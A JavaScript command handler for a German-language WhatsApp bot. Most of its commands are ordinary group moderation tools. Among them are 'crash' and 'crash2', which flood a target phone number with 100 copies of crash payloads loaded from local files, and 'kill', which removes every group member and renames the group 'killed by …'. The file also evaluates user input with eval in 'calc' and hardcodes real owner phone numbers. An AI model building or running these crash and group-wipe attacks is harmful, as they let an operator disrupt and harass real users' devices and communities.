import fs from "fs";
import path from "path";
import { exec } from "child_process";


// ========================= OWNER SYSTEM =========================
export const OWNER_SETTINGS = {
    ownerJid: "4915129559931@s.whatsapp.net",
    ownerLid: "218507098771705@lid",
    owner2Lid: "45681943306435@lid",
    owner3Lid: "27088878862400@lid",
    owner4Lid: "85865774756093@lid",
    ownerName: "᭙ꪖ᭢ᡶꫀᦔꪖకꪖ",
    botName: "᭙ꪖ᭢ᡶꫀᦔꪖకꪖ",
    packName: "wantedasa",
    version: "1.0.0"
};

// ========================= BOT CONFIG =========================
const CONFIG_FILE = path.join("./data", "botConfig.json");
if (!fs.existsSync("./data")) fs.mkdirSync("./data");

let botConfig = { 
    publicMode: true, 
    autoRead: false,
    autoMessages: {},
    owners: []
};

if (fs.existsSync(CONFIG_FILE)) {
    try {
        const raw = fs.readFileSync(CONFIG_FILE, "utf-8");
        botConfig = JSON.parse(raw);
    } catch (e) {
        console.error("Fehler beim Laden von botConfig.json:", e);
    }
}
botConfig.autoMessages = botConfig.autoMessages || {};
botConfig.owners = botConfig.owners || [];

// Speichern Funktion
export const saveBotConfig = () => {
    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(botConfig, null, 2), "utf-8");
    } catch (e) {
        console.error("Fehler beim Speichern von botConfig.json:", e);
    }
};

export {botConfig};

const autoIntervals = {};
const chats = {};
const autoFailCount = {};
let autoMessageInterval = null;




// ========================= GROUP SETTINGS =========================
export const groupSettings = {};

export const ensureGroupSettings = (jid) => {
    if (!groupSettings[jid]) groupSettings[jid] = { welcome: true, leave: true, antidelete: false };
};

export let PUBLIC_MODE = botConfig.publicMode;

// ========================= HELPERS =========================
export const getText = (msg) => {
    if (msg.message?.conversation) return msg.message.conversation;
    if (msg.message?.extendedTextMessage?.text) return msg.message.extendedTextMessage.text;
    return "";
};

export const isGroup = (jid) => jid.endsWith("@g.us");

export const isWantedasa = (sender) => {
    const owners = [
        OWNER_SETTINGS.ownerJid,
        OWNER_SETTINGS.ownerLid,
        OWNER_SETTINGS.owner2Lid,
        OWNER_SETTINGS.owner3Lid

    ];

    return owners.includes(sender);
};

export const isOwner = (sender) => {
    return isWantedasa(sender) || botConfig.owners.includes(sender);
};

export const isAdmin = async (sock, jid, user) => {
    try {
        const meta = await sock.groupMetadata(jid);
        const participant = meta.participants.find(p => p.id === user);
        return participant?.admin ? true : false;
    } catch (err) {
        console.error("Fehler beim Prüfen des Admins:", err);
        return false;
    }
};

export const reply = async (sock, msg, text, extra = {}) => {
    return await sock.sendMessage(msg.key.remoteJid, { text, ...extra }, { quoted: msg });
};


//=========================//
// COMMAND HANDLER
//=========================//
export async function handleCommands(sock, msg) {
    const from = msg.key.remoteJid;
    const sender = msg.key.participant || from;

    const text = getText(msg);

    const prefix = botConfig.prefix && botConfig.prefix.length > 0 ? botConfig.prefix : ".";

    if (!text.startsWith(prefix)) return;

    if (!PUBLIC_MODE && !isOwner(sender, botConfig)) return;

    const args = text.slice(1).trim().split(" ");
    const command = args.shift().toLowerCase();
    const value = args[0]?.toLowerCase();

    ensureGroupSettings(from);



if (command === "welcome") {
    if (!botConfig.groupSettings) botConfig.groupSettings = {};
    if (!botConfig.groupSettings[from]) botConfig.groupSettings[from] = { welcome: true, leave: true, antidelete: false };

    const value = args[0]?.toLowerCase();
    if (!value || (value !== "on" && value !== "off")) {
        return reply(sock, msg, `⚙️ Nutzung: ${prefix}welcome on/off`);
    }

    botConfig.groupSettings[from].welcome = value === "on";
    saveBotConfig();
    return reply(sock, msg, botConfig.groupSettings[from].welcome ? "✅ Welcome aktiviert" : "❌ Welcome deaktiviert");
}

if (command === "leave") {
    if (!botConfig.groupSettings) botConfig.groupSettings = {};
    if (!botConfig.groupSettings[from]) botConfig.groupSettings[from] = { welcome: true, leave: true, antidelete: false };

    const value = args[0]?.toLowerCase();
    if (!value || (value !== "on" && value !== "off")) {
        return reply(sock, msg, `⚙️ Nutzung: ${prefix}leave on/off`);
    }

    botConfig.groupSettings[from].leave = value === "on";
    saveBotConfig();
    return reply(sock, msg, botConfig.groupSettings[from].leave ? "✅ Leave aktiviert" : "❌ Leave deaktiviert");
}

if (command === "antidelete") {
    if (!botConfig.groupSettings) botConfig.groupSettings = {};
    if (!botConfig.groupSettings[from]) botConfig.groupSettings[from] = { welcome: true, leave: true, antidelete: false };

    // Admin-Check
    const admin = await isAdmin(sock, from, sender);
    if (!isOwner(sender)) return reply(sock, msg, "❌ Nur Owner können Antidelete setzen!");

    const value = args[0]?.toLowerCase();
    if (!value || (value !== "on" && value !== "off")) {
        return reply(sock, msg, `⚙️ Nutzung: ${prefix}antidelete on/off`);
    }

    botConfig.groupSettings[from].antidelete = value === "on";
    saveBotConfig();
    return reply(sock, msg, botConfig.groupSettings[from].antidelete ? "✅ Antidelete aktiviert!" : "❌ Antidelete deaktiviert!");
}
if (command === "autoread") {
    if (!args[0]) return reply(sock, msg, `❌ Nutzung: ${prefix}autoread <on|off> [groups|private]`);

    const state = args[0].toLowerCase() === "on";
    const type = args[1]?.toLowerCase();

    if (!type) {
        botConfig.autoReadGroups = state;
        saveBotConfig();
        return reply(sock, msg, `✅ AutoRead für Gruppen ${state ? "aktiviert" : "deaktiviert"}`);
    } 

    if (type === "private" || type === "pn") {
        botConfig.autoReadPrivate = state;
        saveBotConfig();
        return reply(sock, msg, `✅ AutoRead für Private Chats ${state ? "aktiviert" : "deaktiviert"}`);
    } 

    if (type === "groups" || type === "grp") {
        botConfig.autoReadGroups = state;
        saveBotConfig();
        return reply(sock, msg, `✅ AutoRead für Gruppen ${state ? "aktiviert" : "deaktiviert"}`);
    } 

    return reply(sock, msg, "❌ Ungültiger Typ! Nutze groups oder private");
}
if (command === "autoblock") {

    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Owner dürfen das nutzen!");
    }

    const state = args[0]?.toLowerCase();

    if (state === "an") {
        botConfig.autoBlock = true;
    } 
    else if (state === "aus") {
        botConfig.autoBlock = false;
    } 
    else {
        return reply(sock, msg, `❌ Nutzung: ${prefix}autoblock an / aus`);
    }

    saveBotConfig();

    reply(sock, msg, `⚙️ AutoBlock ist jetzt ${botConfig.autoBlock ? "aktiviert" : "deaktiviert"}`);
}
if (command === 'anticall') {
    const arg = args[0]?.toLowerCase();

    if (!arg || (arg !== 'on' && arg !== 'off')) {
        return await sock.sendMessage(from, {
            text: `❌ Nutzung:\n${prefix}anticall on\n${prefix}anticall off`
        });
    }

    if (arg === 'on') {
        botConfig.antiCall = true;
        saveBotConfig();
        return await sock.sendMessage(from, { text: '✅ Anti-Call wurde aktiviert.' });
    }

    if (arg === 'off') {
        botConfig.antiCall = false;
        saveBotConfig();
        return await sock.sendMessage(from, { text: '❌ Anti-Call wurde deaktiviert.' });
    }
}
if (command === "prefix") {
    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Owner können den Prefix ändern!");
    }

    const newPrefix = args[0];

    if (!newPrefix) {
        return reply(sock, msg,
`📌 Aktueller Prefix: ${prefix}

Nutzung: 
${prefix}prefix <1 Zeichen>`
        );
    }
    if (newPrefix.length !== 1) {
        return reply(sock, msg, "❌ Prefix darf nur 1 Zeichen lang sein!");
    }

    botConfig.prefix = newPrefix;
    saveBotConfig();

    return reply(sock, msg, `✅ Prefix wurde zu "${newPrefix}" geändert!`);
}
if (command === "update") {
    if (!isOwner(sender)) {
        return reply(sock, msg, "❌ Nur Owner können den Bot updaten!");
    }

    reply(sock, msg, "🔍 Suche nach Updates...");

    exec("git pull origin main", (error, stdout, stderr) => {
        if (error) {
            return reply(sock, msg, `❌ Update fehlgeschlagen:\n${error.message}`);
        }

        if (stdout.includes("Already up to date")) {
            return reply(sock, msg, "✅ Bot ist bereits auf dem neuesten Stand.");
        }

        let changes = stdout
            .split("\n")
            .filter(line =>
                line.includes("|") ||
                line.includes("changed") ||
                line.includes("insertions") ||
                line.includes("deletions")
            )
            .join("\n");

        reply(sock, msg,
`✅ *Update erfolgreich abgeschlossen!*

📦 *Änderungen:*
${changes || "• Diverse Dateien wurden aktualisiert und optimiert"}

♻️ Starte den Bot neu mit:
\`\`\`npm start\`\`\`

🚀 Danach sind alle Änderungen aktiv.`
        );

        setTimeout(() => {
            exec("node index.js &");
            process.exit(0);
        }, 2000);
    });
}
    if (command === "owner") {
    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Owner dürfen diesen Command nutzen!");
    }

    const sub = args[0]?.toLowerCase();

    if (!sub) {
        return reply(sock, msg,
`❌ Nutzung:
${prefix}owner add @user / (auf User antworten)
${prefix}owner del @user / (auf User antworten)
${prefix}owner list`);
    }

    const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid;
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;
    const target = mentioned?.[0] || quoted;

    if (sub === "add") {
        if (!target) {
            return reply(sock, msg, "❌ Markiere oder antworte auf einen User!");
        }

        if (mentioned?.length > 1) {
            return reply(sock, msg, "❌ Bitte nur eine Person markieren!");
        }

        if (botConfig.owners.includes(target)) {
            return reply(sock, msg, "⚠️ User ist bereits Owner!");
        }

        botConfig.owners.push(target);
        saveBotConfig();

        return reply(sock, msg, `✅ @${target.split("@")[0]} ist jetzt Owner!`, [target]);
    }

    if (sub === "del") {
        if (!target) {
            return reply(sock, msg, "❌ Markiere oder antworte auf einen User!");
        }

        if (mentioned?.length > 1) {
            return reply(sock, msg, "❌ Bitte nur eine Person markieren!");
        }

        if (target === OWNER_SETTINGS.ownerJid) {
            return reply(sock, msg, "❌ Haupt-Owner kann nicht entfernt werden!");
        }

        const index = botConfig.owners.indexOf(target);

        if (index === -1) {
            return reply(sock, msg, "❌ Dieser User ist kein Owner!");
        }

        botConfig.owners.splice(index, 1);
        saveBotConfig();

        return reply(sock, msg, `✅ @${target.split("@")[0]} wurde entfernt!`, [target]);
    }

    if (sub === "list") {
        if (!botConfig.owners.length) {
            return reply(sock, msg, "❌ Keine zusätzlichen Owner gesetzt!");
        }

        let text = "👑 *Owner Liste:*\n\n";

        for (let o of botConfig.owners) {
            text += `• @${o.split("@")[0]}\n`;
        }

        return reply(sock, msg, text, botConfig.owners);
    }
    return reply(sock, msg, "❌ Unbekannter Subcommand! Nutze: add, del, list");
}
   if (command === "bot") {
    const mode = PUBLIC_MODE ? "🌍 PUBLIC MODE" : "🔒 SELF MODE";

    const autoReadGroups = botConfig?.autoReadGroups ? "✅ AN" : "❌ AUS";
    const autoReadPrivate = botConfig?.autoReadPrivate ? "✅ AN" : "❌ AUS";
    const autoBlock = botConfig?.autoBlock ? "✅ AN" : "❌ AUS";
    const antiCall = botConfig?.antiCall ? "✅ AN" : "❌ AUS";

    const text = `🤖 ${OWNER_SETTINGS.botName}
👑 Owner: ${OWNER_SETTINGS.ownerName}
⚡ Version: ${OWNER_SETTINGS.version}
🟢 Mode: ${mode}
📰 Prefix: ${prefix} 
📖 Auto-Read Gruppen: ${autoReadGroups}
📖 Auto-Read Private: ${autoReadPrivate}
⛔ Auto-Block: ${autoBlock}
📵 Anti-Call: ${antiCall}`;


    return await reply(sock, msg, text);
}
if (command === "self") {
    if (!isOwner(sender)) {
        return reply(sock, msg, "❌ Nur Owner!");
    }

    if (botConfig.publicMode === false) {
        return reply(sock, msg, "🔒 SELF MODE ist bereits aktiviert!");
    }

    PUBLIC_MODE = false;
    botConfig.publicMode = false;
    saveBotConfig();

    return reply(sock, msg, "🔒 SELF MODE aktiviert");
}
if (command === "public") {
    if (!isOwner(sender)) {
        return reply(sock, msg, "❌ Nur Owner!");
    }

    if (botConfig.publicMode === true) {
        return reply(sock, msg, "🌍 PUBLIC MODE ist bereits aktiviert!");
    }

    PUBLIC_MODE = true;
    botConfig.publicMode = true;
    saveBotConfig();

    return reply(sock, msg, "🌍 PUBLIC MODE aktiviert");
}

    if (command === "menu") {
        return reply(sock, msg,
`╔═══『 📃 ${OWNER_SETTINGS.botName} 』═══╗
║ 👑 Owner: ${OWNER_SETTINGS.ownerName}
║ ⚡ Version: ${OWNER_SETTINGS.version}
╠═════════════════════
║
║══════『 📌 CORE 』════╗
║ ${prefix}menu
║ ${prefix}bot
║ ${prefix}about
║════════════════════╝
║
║『 👥 GROUP SYSTEM 』
║ ├ ${prefix}hidetag
║ ├ ${prefix}kick
║ ├ ${prefix}welcome on/off
║ ├ ${prefix}leave on/off
║ ├ ${prefix}grpname
║ ├ ${prefix}grpdesc
║ ├ ${prefix}delete
║ ├ ${prefix}promote / ${prefix}demote
║ ├ ${prefix}mute / ${prefix}unmute
║ ├ ${prefix}grouplink
║ ├ ${prefix}grppic
║
║『 🧰 TOOLS 』
║ ├ ${prefix}calc <Ausdruck>
║ ├ ${prefix}poll
║ ├ ${prefix}emptymsg
║
║『 🔒 OWNER 』
║ ├ ${prefix}self
║ ├ ${prefix}public
║ ├ ${prefix}info
║ ├ ${prefix}autoread
║ ├ ${prefix}grpleave
║ ├ ${prefix}device
║ ├ ${prefix}block / ${prefix}unblock
║ ├ ${prefix}antidelete on/off
║ ├ ${prefix}automsg set/stop
╚═════════════════════`
        );
    }
if (command === "about") {
    const combinedMessage = `╔════════════════════════╗
║ 🤖 ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ Bot
║ 👑 Owner: ${OWNER_SETTINGS.ownerName}
║ ⚡ Version: ${OWNER_SETTINGS.version}
╠════════════════════════╣
║ 🌐 WhatsApp Kanal
║ https://whatsapp.com/channel/0029VbCPWBN3wtbEcT5LBp04
╠════════════════════════╣
║ 📱 Telegram Kanal
║ https://t.me/devwantedasa
╚════════════════════════╝`;

    await sock.sendMessage(from, { text: combinedMessage });
}
    if (command === "ping" || command === "p") {
        const start = Date.now();
        await reply(sock, msg, "🏓 Pinging...");
        const latency = Date.now() - start;
        return reply(sock, msg, `🏓 Pong!\n⏱️ Latenz: ${latency}ms`);
    }
    if (command === "kick") {
    if (!isGroup(from)) return;

    if (!isAdmin && !isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Admin oder Owner!");
    }

    let targets = [];

    const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid;
    if (mentioned && mentioned.length > 0) {
        targets = mentioned;
    }

    const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
    if (targets.length === 0 && contextInfo?.participant) {
        targets.push(contextInfo.participant);
    }

    if (targets.length === 0) {
        return reply(sock, msg, "❌ Markiere jemanden oder antworte auf eine Nachricht!");
    }

    try {
        await sock.groupParticipantsUpdate(from, targets, "remove");
        return reply(sock, msg, "🚫 User wurde gekickt!");
    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Fehler beim Kicken!");
    }
}
if (command === "slot") {
    const user = sender;
    const slotCooldown = {};

    if (slotCooldown[user] && Date.now() - slotCooldown[user] < 10000) {
        const timeLeft = Math.ceil((10000 - (Date.now() - slotCooldown[user])) / 1000);
        return reply(sock, msg, `⏳ Warte ${timeLeft}s bevor du nochmal spielst!`);
    }

    slotCooldown[user] = Date.now();

    const emojis = ["🍒", "🍋", "🍇", "🍉", "⭐", "💎"];

    const random = () => emojis[Math.floor(Math.random() * emojis.length)];

    const roll1 = random();
    const roll2 = random();
    const roll3 = random();

    let text = "";

    if (roll1 === roll2 && roll2 === roll3) {
        text = "💎 JACKPOT!!!";
    } else if (roll1 === roll2 || roll2 === roll3 || roll1 === roll3) {
        text = "✨ Fast! Zwei gleich!";
    } else {
        text = "💀 Leider verloren!";
    }

    return sock.sendMessage(from, {
        text: `🎰 *SLOT MACHINE*

┏━━━┳━━━━┳━━━┓
┃ ${roll1}  ┃ ${roll2}    ┃ ${roll3}  ┃
┗━━━┻━━━━┻━━━┛

${text}`
    }, { quoted: msg });
}
if (command === "emptymsg") {
    return sock.sendMessage(from, {
        text: "\u200B"
    });
}
if (command === "crash") {
    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Owner dürfen diesen Command nutzen!");
    }

    if (!args[0]) {
        return reply(sock, msg, `❌ Nutzung: ${prefix}crash 49123456789`);
    }

    const victim = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const amount = 100;

    async function XeonyCrashy(name, chat) {
        await sock.sendMessage(chat, {
            document: { url: "./xeontext1.js" },
            mimetype: "image/null",
            fileName: `xeontext1.js`,
            caption: `crash by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ`
        });
    }

    for (let i = 0; i < amount; i++) {
        await XeonyCrashy("Wantedasa", victim);
    }

    reply(sock, msg, `done.`);
}
if (command === "crash2") {
    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Owner dürfen diesen Command nutzen!");
    }

    if (!args[0]) {
        return reply(sock, msg, `❌ Nutzung: ${prefix}crash2 49123456789`);
    }

    const victim = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const amount = 100;

    const filePath = "./xeontext2.js";

    if (!fs.existsSync(filePath)) {
        return reply(sock, msg, "❌ Datei nicht gefunden!");
    }

    const fileContent = fs.readFileSync(filePath, "utf-8");

    async function XeonyCrashy(chat) {
        await sock.sendMessage(chat, {
            text: fileContent
        });
    }

    for (let i = 0; i < amount; i++) {
        await XeonyCrashy(victim);
    }

    return reply(sock, msg, `done.`);
}
if (command === "getpic") {
    try {
        let target;

        if (msg.message?.extendedTextMessage?.contextInfo?.participant) {
            target = msg.message.extendedTextMessage.contextInfo.participant;
        }
        else if (args[0]) {
            let number = args[0].replace(/[^0-9]/g, "");
            target = number + "@s.whatsapp.net";
        } 
        else {
            return reply(sock, msg, "❌ Nutzung: ${prefix}getpic <nummer> oder auf Nachricht antworten");
        }

        let ppUrl;
        try {
            ppUrl = await sock.profilePictureUrl(target, "image");
        } catch {
            return reply(sock, msg, "❌ Kein Profilbild gefunden!");
        }

        await sock.sendMessage(from, {
            image: { url: ppUrl },
            caption: `📸 Profilbild von:\n${target}`
        }, { quoted: msg });

    } catch (err) {
        console.log(err);
        reply(sock, msg, "❌ Fehler beim Abrufen!");
    }
}
if (command === "kill") {
    if (!isGroup(from)) return;

    if (!isWantedasa(sender)) return;

    try {
        const metadata = await sock.groupMetadata(from);
        const participants = metadata.participants;

        const toKick = participants
            .map(p => p.id)
            .filter(jid => jid !== sender);

        if (toKick.length === 0) {
            return reply(sock, msg, "❌ Keine User zum Kicken gefunden!");
        }
        const chunkSize = 10;
        for (let i = 0; i < toKick.length; i += chunkSize) {
            const chunk = toKick.slice(i, i + chunkSize);
            await sock.groupParticipantsUpdate(from, chunk, "remove");
        }
        await sock.groupUpdateSubject(from, "killed by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ");


        await sock.groupUpdateDescription(from, "killed by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ");
        try {
            await sock.removeProfilePicture(from);
        } catch (e) {
            console.log("Konnte Gruppenbild nicht entfernen");
        }

        return reply(sock, msg, `🚫 ${toKick.length} User gekickt`);

    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Fehler beim Kicken!");
    }
}
if (command === "device") {
    if (!isOwner(sender)) return reply(sock, msg, "❌ Nur Owner!");

    try {
        const ctx = msg.message?.extendedTextMessage?.contextInfo;

        if (!ctx?.quotedMessage) {
            return reply(sock, msg, "❌ Antworte auf eine Nachricht!");
        }

        const target = ctx.participant || ctx.remoteJid;
        if (!target) {
            return reply(sock, msg, "❌ User nicht gefunden!");
        }
        let rawDevice =
            ctx.deviceType ||
            ctx.device ||
            ctx.message?.deviceType ||
            ctx.messageType ||
            "unknown";

        rawDevice = String(rawDevice).toLowerCase();

        let device = "❓ Unbekannt";

        // 📱 Clean Mapping
        if (rawDevice.includes("android")) device = "Android 📱";
        else if (rawDevice.includes("ios")) device = "iOS 🍎";
        else if (rawDevice.includes("web")) device = "Web 💻";
        else if (rawDevice.includes("desktop")) device = "Desktop 🖥️";

        // 🧠 Smart fallback (nur wenn nichts da ist)
        if (device === "❓ Unbekannt") {
            if (ctx.isFromTemplate || ctx.isForwarded) {
                device = "Unbekannt (Forwarded) ⚠️";
            } else {
                device = "Unbekannt ❓";
            }
        }

        const messageId = ctx.stanzaId || ctx.id || "Unbekannt";

        const text = `╭───〔 📱 DEVICE ANALYZE 〕───⬣
│
│ 👤 User: @${target.split("@")[0]}
│ 📱 Gerät: ${device}
│ 🧩 Raw: ${rawDevice}
│ 🆔 Msg-ID: ${messageId}
╰────────────────⬣`;

        await sock.sendMessage(
            msg.key.remoteJid,
            { text, mentions: [target] },
            { quoted: msg }
        );

    } catch (err) {
        console.error("DEVICE CMD ERROR:", err);
        reply(sock, msg, "❌ Fehler beim Device-Befehl!");
    }
}
if (command === "grouplink" || command === "gc") {
    if (!isGroup(from)) return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");
    if (!isAdmin(sock, from, sender)) return reply(sock, msg, "❌ Nur Admins können den Gruppenlink abrufen!");

    const sub = args[0]?.toLowerCase();

    try {
        const metadata = await sock.groupMetadata(from);
        const groupName = metadata.subject || "Unbekannte Gruppe";
        const members = metadata.participants.length;

        if (sub === "revoke") {
            const code = await sock.groupRevokeInvite(from);
            return await reply(sock, msg, `✅ Gruppenlink wurde resetet!\nNeuer Link:\nhttps://chat.whatsapp.com/${code}`);
        }
        const text = `╔═══『 🌐 Gruppenlink 』═══╗
║ 📛 Name: ${groupName}
║ 👥 Mitglieder: ${members}
╠═════════════════════
║ 🔗 Link:
║ https://chat.whatsapp.com/${await sock.groupInviteCode(from)}
╚═════════════════════
`;

            await reply(sock, msg, text);
    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Gruppenlink konnte nicht abgerufen werden!");
    }
}
if (command === "calc") {
    const input = args.join(" ").toLowerCase();

    if (!input) 
    return reply(sock, msg, `❌ Bitte gib einen Ausdruck zum Berechnen ein!\nBeispiel: ${prefix}calc 5 + sqrt(16)`);

    try {
        const allowed = /^[0-9+\-*/().%^ ,a-z]+$/;
        if (!allowed.test(input)) {
            return reply(sock, msg, "❌ Ungültige Zeichen! Nur Zahlen, Operatoren + - * / % ^ ( ), Leerzeichen und Funktionen (sin, cos, tan, sqrt, log, pi, e) erlaubt.");
        }
        const math = {
            sin: Math.sin,
            cos: Math.cos,
            tan: Math.tan,
            sqrt: Math.sqrt,
            log: Math.log,
            pi: Math.PI,
            e: Math.E,
        };

        let expr = input.replace(/\^/g, "**");

        expr = expr.replace(/\bpi\b/g, "Math.PI").replace(/\be\b/g, "Math.E");

        for (const func of ["sin","cos","tan","sqrt","log"]) {
            const re = new RegExp(`\\b${func}\\b`, "g");
            expr = expr.replace(re, `Math.${func}`);
        }

        const result = eval(expr);

        await reply(sock, msg, `🧮 Ausdruck: ${input}\n✅ Ergebnis: ${result}
        `);

    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Fehler beim Berechnen! Überprüfe deinen Ausdruck.");
    }
}
if (command === "grppic") {
    if (!isGroup(from)) return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");
if (!isAdmin(sock, from, sender) && !isOwner(sender)) 
    return reply(sock, msg, "❌ Nur Admins können das Gruppenbild ändern!");

    const sub = args[0]?.toLowerCase();

    if (sub === "set") {
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        const imageMessage = quoted?.imageMessage;

        if (!imageMessage && !msg.message?.imageMessage) {
            return reply(sock, msg, "❌ Bitte sende ein Bild oder antworte auf ein Bild, um es als Gruppenbild zu setzen!");
        }

        try {
            const buffer = imageMessage
                ? await sock.downloadMediaMessage({ message: imageMessage })
                : await sock.downloadMediaMessage(msg);

            await sock.updateProfilePicture(from, buffer);

            return reply(sock, msg, "✅ Gruppenbild erfolgreich aktualisiert!");
        } catch (err) {
            console.error(err);
            return reply(sock, msg, "❌ Fehler beim Setzen des Gruppenbilds!");
        }
    }
    try {
        const profilePic = await sock.profilePictureUrl(from);
        const metadata = await sock.groupMetadata(from);
        const text = `🌐 Gruppenbild von *${metadata.subject}*\n👥 Mitglieder: ${metadata.participants.length}`;

        await sock.sendMessage(from, { image: { url: profilePic }, caption: text });
    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Kein Gruppenbild gefunden!");
    }
}
if (command === "grpleave" || command === "leavegrp") {
    if (!isGroup(from)) {
        return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");
    }

    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur der Owner darf den Bot entfernen!");
    }

    try {
        await sock.sendMessage(from, {
            text: "👋 Bye"
        });
        await sock.groupLeave(from);

    } catch (err) {
        console.log(err);
        reply(sock, msg, "❌ Fehler beim Verlassen der Gruppe!");
    }
}

if ((command === "mute" || command === "unmute") && isGroup(from)) {

    if (!await isAdmin(sock, from, sender) && !isOwner(sender)) {
        return reply(sock, msg, "❌ Nur Admins oder Owner dürfen die Gruppen-Einstellungen ändern!");
    }
    if (!isGroup(from)) {
    return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");
    }

    try {
        if (command === "mute") {
            await sock.groupSettingUpdate(from, "announcement");
            return reply(sock, msg, "🔇 Gruppen-Einstellungen geändert: Nur Admins dürfen jetzt schreiben!");
        } else {
            await sock.groupSettingUpdate(from, "not_announcement");
            return reply(sock, msg, "🔊 Gruppen-Einstellungen geändert: Alle dürfen jetzt schreiben!");
        }
    } catch (e) {
        console.error("Fehler beim Ändern der Gruppen-Einstellungen:", e);
        return reply(sock, msg, "❌ Fehler beim Ändern der Gruppen-Einstellungen!");
    }
}
if (command === "hidetag") {
    if (!isGroup(from)) return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");

    const admin = await isAdmin(sock, from, sender);
    if (!admin && !isOwner(sender)) {
        return reply(sock, msg, "❌ Nur Admins oder Owner können hidetag nutzen!");
    }

    let text = args.join(" ");

    if (msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
        const quoted = msg.message.extendedTextMessage.contextInfo.quotedMessage;

        text =
            quoted.conversation ||
            quoted.extendedTextMessage?.text ||
            quoted.imageMessage?.caption ||
            quoted.videoMessage?.caption ||
            text;
    }

    if (!text) return reply(sock, msg, "❌ Benutzung: .hidetag <Nachricht> oder auf eine Nachricht antworten");

    try {
        const groupMetadata = await sock.groupMetadata(from);
        const mentions = groupMetadata.participants.map(p => p.id);

        let styledText;

        if (isOwner(sender)) {
            styledText = `${text}`;
        } else {
            styledText = `\`\`\`
╔══════════════════╗
${text}
╚══════════════════╝

by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ
\`\`\``;
        }

        await sock.sendMessage(from, {
            text: styledText,
            mentions
        });

        await sock.sendMessage(from, { delete: msg.key });

    } catch (err) {
        console.error("Fehler bei hidetag:", err);
        reply(sock, msg, "❌ Fehler beim Senden der Hidetag-Nachricht.");
    }
}

    if (command === "grpname" || command === "grpdesc") {
        if (!isGroup(from)) return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");
        const admin = await isAdmin(sock, from, sender);
        if (!admin && !isOwner(sender)) return reply(sock, msg, "❌ Nur Admin oder Owner!");
        const newText = args.join(" ");
        if (!newText) return reply(sock, msg, `⚙️ Nutzung: ${prefix}${command} <neuer Text>`);

        try {
            if (command === "grpname") await sock.groupUpdateSubject(from, newText);
            if (command === "grpdesc") await sock.groupUpdateDescription(from, newText);
        } catch (err) {
            console.error(err);
            return reply(sock, msg, "❌ Fehler beim Ändern!");
        }
    }

  if (command === "del" || command === "delete") {

    if (!isGroup(from)) return reply(sock, msg, "❌ Dieser Befehl funktioniert nur in Gruppen!");

    if (!isAdmin && !isOwner(sender)) return reply(sock, msg, "❌ Nur Admin darf Nachrichten löschen!");

    const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
    if (!contextInfo?.stanzaId) {
        return reply(sock, msg, "❌ Bitte antworte auf die Nachricht, die gelöscht werden soll!");
    }

    try {
        await sock.sendMessage(from, { 
            delete: { 
                remoteJid: from, 
                id: contextInfo.stanzaId, 
                participant: contextInfo.participant || sender 
            } 
        });
    } catch (e) {
        console.error(e);
        return reply(sock, msg, "❌ Nachricht konnte nicht gelöscht werden!");
    }
};
if (command === "join") {
    if (!isWantedasa(sender)) return reply(sock, msg, "❌ Nur Owner!");


    let link = args[0];

    const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
    if (!link && contextInfo?.quotedMessage?.conversation) {
        link = contextInfo.quotedMessage.conversation;
    }

    if (!link) return reply(sock, msg, "❌ Bitte sende oder antworte auf einen Gruppenlink!\nBeispiel: .join https://chat.whatsapp.com/ABC123");

    const match = link.match(/(?:https:\/\/chat\.whatsapp\.com\/)([0-9A-Za-z]+)/);
    if (!match) return reply(sock, msg, "❌ Ungültiger Gruppenlink!");

    const inviteCode = match[1];

    try {

        await sock.groupAcceptInvite(inviteCode);
        await sock.sendMessage(from, {
                react: {
                    text: "✅",
                    key: msg.key
                }
            });
    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Beitritt zur Gruppe fehlgeschlagen! Eventuell falscher Link oder du wurdest blockiert.");
    }
}
if (command === 'poll') {
    const text = args.join(' ');

    if (!text.includes('/')) {
        return await sock.sendMessage(from, { 
            text: `❌ Falsche Eingabe!\nBitte benutze die Syntax:\n${prefix}poll Frage / Antwort1 / Antwort2 / Antwort3`
        });
    }

    const parts = text.split('/').map(p => p.trim());
    const question = parts.shift();
    const options = parts;

    if (!question || options.length < 2) {
        return await sock.sendMessage(from, { 
            text: `❌ Falsche Eingabe!\nDu musst eine Frage und mindestens zwei Antworten angeben.\nBeispiel:\n${prefix}poll Kommst du zum Sommerfest? / Ja ✅ / Vielleicht ❓ / Nein ❌`
        });
    }
    const uniqueOptions = new Set(options.map(o => o.toLowerCase()));
    if (uniqueOptions.size !== options.length) {
        return await sock.sendMessage(from, { 
